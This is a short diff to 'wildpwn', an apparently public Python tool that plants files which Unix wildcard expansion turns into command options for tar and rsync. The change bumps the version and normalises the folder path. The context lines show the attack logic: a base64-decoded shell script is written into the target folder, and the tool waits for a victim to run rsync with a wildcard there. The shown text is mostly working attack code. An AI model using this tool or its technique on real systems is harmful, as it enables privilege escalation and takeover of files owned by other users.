@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-# wildpwn v0.1
+# wildpwn v0.1.1
 # Tool to generate unix wildcard attacks
 # Based on this paper: https://www.exploit-db.com/papers/33930/
 # Follow: @mattdch
@@ -41,12 +41,17 @@ def rsyncAttack():
 	shellScript.write(base64.b64decode(b64Script))
 	shellScript.close()
 	print "[+] Done! Now wait for something like: rsync -t * foo:src/ on " + args.folder + ". Good luck!"
+
 # Help & arguments parsing
 parser = argparse.ArgumentParser(description="Tool to generate wildcard attacks")
 parser.add_argument("payload", type=str, help="Payload to use: (combined | tar | rsync)", metavar="payload", choices=['combined', 'tar', 'rsync'])
 parser.add_argument("folder", type=str, help="Where to write the payloads")
 parser.add_argument("--file", type=str, help="Path to file for taking ownership / change permissions. Use it with combined attack only.")
 args = parser.parse_args()
+
+# Add ending slash
+if not args.folder.endswith('/'):
+	args.folder = args.folder + "/"
 
 # Map the inputs to the function blocks
 runPayload = {"combined" : combinedAttack,
